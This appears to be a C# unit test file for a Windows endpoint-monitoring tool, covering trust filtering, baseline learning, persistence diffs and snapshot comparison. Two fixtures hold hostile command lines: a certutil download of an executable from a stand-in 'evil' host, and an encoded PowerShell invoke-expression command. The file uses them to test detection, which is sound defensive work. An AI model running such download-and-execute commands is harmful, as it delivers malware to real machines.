using Radar.Core.Analysis;
using Radar.Core.Filtering;
using Radar.Core.Model;

namespace Radar.Core.Tests;

public class VisibilityFilterTests
{
    private static readonly VisibilityFilter Filter = new();
    private static readonly TrustListEntry[] NoTrust = [];

    [Fact]
    public void Microsoft_signed_in_system32_is_hidden_by_default()
    {
        var exec = TestData.Execution(
            path: @"C:\Windows\System32\taskhostw.exe",
            signature: SignatureStatus.SignedTrusted,
            isMicrosoftRoot: true);
        var decision = Filter.Decide(exec, NoTrust);
        Assert.False(decision.Visible);
        Assert.True(decision.TrustedByDefault);
    }

    [Fact]
    public void Protected_process_is_hidden()
    {
        var decision = Filter.Decide(TestData.Execution(), NoTrust, isProtectedProcess: true);
        Assert.False(decision.Visible);
        Assert.Contains("PPL", decision.Reason);
    }

    [Fact]
    public void Unsigned_binary_stays_on_radar()
    {
        var decision = Filter.Decide(TestData.Execution(), NoTrust);
        Assert.True(decision.Visible);
    }

    [Fact]
    public void Lolbin_with_anomalous_pattern_comes_back_to_radar()
    {
        // Mesmo confiável da Microsoft, volta ao radar
        var exec = TestData.Execution(
            path: @"C:\Windows\System32\certutil.exe",
            commandLine: "certutil -urlcache -split -f http://evil/p.exe p.exe",
            signature: SignatureStatus.SignedTrusted,
            isMicrosoftRoot: true);
        var decision = Filter.Decide(exec, NoTrust);
        Assert.True(decision.Visible);
        Assert.Contains("LOLBin", decision.Reason);
    }

    [Fact]
    public void Shell_with_suspicious_command_line_comes_back()
    {
        var exec = TestData.Execution(
            path: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            commandLine: "powershell -enc SQBFAFgAIABoAHQAdABwADoALwAvAGUAdgBpAGwA",
            signature: SignatureStatus.SignedTrusted,
            isMicrosoftRoot: true);
        Assert.True(Filter.Decide(exec, NoTrust).Visible);
    }

    [Fact]
    public void Unsigned_module_in_trusted_process_comes_back()
    {
        var exec = TestData.Execution(
            path: @"C:\Windows\System32\notepad.exe",
            signature: SignatureStatus.SignedTrusted,
            isMicrosoftRoot: true);
        Assert.True(Filter.Decide(exec, NoTrust, loadedUnsignedModuleFromWritableDir: true).Visible);
    }

    [Fact]
    public void Trust_list_matches_only_full_tuple()
    {
        var exec = TestData.Execution(signature: SignatureStatus.SignedTrusted,
            signerSubject: "Acme Corp");
        var matching = new TrustListEntry
        {
            Sha256 = exec.Binary.Sha256!,
            Path = exec.Binary.Path,
            SignerSubject = "Acme Corp",
        };
        Assert.False(Filter.Decide(exec, [matching]).Visible);

        // Hash diferente → não casa, permanece visível (nunca só por nome)
        var wrongHash = matching with { Sha256 = "0000" };
        Assert.True(Filter.Decide(exec, [wrongHash]).Visible);
    }

    [Fact]
    public void Modes_work_as_specified()
    {
        var hidden = new VisibilityDecision { Visible = false, TrustedByDefault = true, Reason = "x" };
        var lowScore = new SuspicionScore { Total = 10 };
        var highScore = new SuspicionScore { Total = 60 };

        Assert.False(VisibilityFilter.PassesMode(VisibilityMode.Focus, hidden, lowScore));
        Assert.True(VisibilityFilter.PassesMode(VisibilityMode.Audit, hidden, lowScore));
        Assert.False(VisibilityFilter.PassesMode(VisibilityMode.AttentionQuarantine, hidden, lowScore));
        Assert.True(VisibilityFilter.PassesMode(VisibilityMode.AttentionQuarantine, hidden, highScore));
    }

    [Theory]
    [InlineData(@"C:\Users\alice\AppData\Local\Temp\x.exe", true)]
    [InlineData(@"C:\Users\alice\Downloads\x.exe", true)]
    [InlineData(@"C:\Users\Public\share\x.exe", true)]
    [InlineData(@"C:\$Recycle.Bin\S-1-5-21\x.exe", true)]
    [InlineData(@"C:\Program Files\Vendor\x.exe", false)]
    [InlineData(@"C:\Windows\System32\x.exe", false)]
    public void User_writable_directory_detection(string path, bool expected) =>
        Assert.Equal(expected, VisibilityFilter.IsUserWritableDirectory(path));
}

public class BaselineEngineTests
{
    [Fact]
    public void First_run_is_novel_then_absorbed()
    {
        var engine = new BaselineEngine();
        var state = new BaselineState
        {
            LearningStartedUtc = DateTimeOffset.UtcNow,
            LearningPeriod = TimeSpan.FromDays(7),
        };
        var exec = TestData.Execution();

        var before = engine.Evaluate(state, exec, ["novo.example.com"]);
        Assert.True(before.FirstRunOfBinary);
        Assert.True(before.FirstContactWithDomain);
        Assert.Equal(0, before.PrevalenceRunCount);

        engine.Absorb(state, exec, ["novo.example.com"]);
        var after = engine.Evaluate(state, exec, ["novo.example.com"]);
        Assert.False(after.FirstRunOfBinary);
        Assert.False(after.FirstContactWithDomain);
        Assert.Equal(1, after.PrevalenceRunCount);
    }

    [Fact]
    public void Prevalence_accumulates_with_first_seen_kept()
    {
        var engine = new BaselineEngine();
        var state = new BaselineState { LearningPeriod = TimeSpan.FromDays(7) };
        var first = TestData.Execution(created: new DateTimeOffset(2026, 6, 1, 0, 0, 0, TimeSpan.Zero));
        engine.Absorb(state, first);
        engine.Absorb(state, TestData.Execution(created: new DateTimeOffset(2026, 6, 9, 0, 0, 0, TimeSpan.Zero)));

        var info = state.Prevalence[first.Binary.Sha256!];
        Assert.Equal(2, info.RunCount);
        Assert.Equal(first.CreatedUtc, info.FirstSeenUtc);
    }

    [Fact]
    public void Signer_reputation_requires_age_and_breadth()
    {
        var now = DateTimeOffset.UtcNow;
        (string, DateTimeOffset, int)[] stats =
        [
            ("Old Corp", now.AddDays(-90), 5),
            ("New Corp", now.AddDays(-2), 5),
            ("Narrow Corp", now.AddDays(-90), 1),
        ];
        Assert.True(BaselineEngine.SignerHasEstablishedReputation(stats, "Old Corp", now));
        Assert.False(BaselineEngine.SignerHasEstablishedReputation(stats, "New Corp", now));
        Assert.False(BaselineEngine.SignerHasEstablishedReputation(stats, "Narrow Corp", now));
        Assert.False(BaselineEngine.SignerHasEstablishedReputation(stats, null, now));
    }
}

public class PersistenceDifferTests
{
    private static PersistenceEntry Entry(string name, string target = "C:\\x.exe") => new()
    {
        Id = PersistenceDiffer.StableId(PersistenceKind.RunKey, @"HKCU\Run", name),
        Kind = PersistenceKind.RunKey,
        Location = @"HKCU\Run",
        Name = name,
        Target = target,
    };

    [Fact]
    public void Detects_added_changed_removed()
    {
        var now = DateTimeOffset.UtcNow;
        PersistenceEntry[] previous = [Entry("keep"), Entry("change", "C:\\old.exe"), Entry("gone")];
        PersistenceEntry[] current = [Entry("keep"), Entry("change", "C:\\new.exe"), Entry("fresh")];

        var diff = PersistenceDiffer.Diff(previous, current, now);

        Assert.Equal("fresh", Assert.Single(diff.Added).Name);
        Assert.Equal("gone", Assert.Single(diff.Removed).Name);
        var (before, after) = Assert.Single(diff.Changed);
        Assert.Equal("C:\\old.exe", before.Target);
        Assert.Equal("C:\\new.exe", after.Target);
        Assert.True(diff.HasChanges);
    }

    [Fact]
    public void No_changes_yields_empty_diff()
    {
        PersistenceEntry[] same = [Entry("a"), Entry("b")];
        Assert.False(PersistenceDiffer.Diff(same, same, DateTimeOffset.UtcNow).HasChanges);
    }
}

public class SnapshotComparisonTests
{
    [Fact]
    public void Detects_new_binaries_persistences_destinations()
    {
        var before = new MachineSnapshot
        {
            TakenUtc = DateTimeOffset.UtcNow.AddDays(-7),
            KnownBinaries = new(StringComparer.OrdinalIgnoreCase) { ["AAA"] = @"C:\a.exe" },
            PersistenceIds = new(StringComparer.OrdinalIgnoreCase) { "runkey|hkcu\\run|a" },
            NetworkDestinations = new(StringComparer.OrdinalIgnoreCase) { "ok.example.com" },
        };
        var after = new MachineSnapshot
        {
            TakenUtc = DateTimeOffset.UtcNow,
            KnownBinaries = new(StringComparer.OrdinalIgnoreCase) { ["AAA"] = @"C:\a.exe", ["BBB"] = @"C:\b.exe" },
            PersistenceIds = new(StringComparer.OrdinalIgnoreCase) { "runkey|hkcu\\run|a", "task|ts|evil" },
            NetworkDestinations = new(StringComparer.OrdinalIgnoreCase) { "ok.example.com", "evil.example.com" },
        };

        var diff = SnapshotComparison.Compare(before, after);
        Assert.Single(diff.NewBinaries);
        Assert.Single(diff.NewPersistences);
        Assert.Contains("evil.example.com", diff.NewDestinations);
        Assert.Empty(diff.RemovedBinaries);
        Assert.True(diff.HasChanges);
    }
}
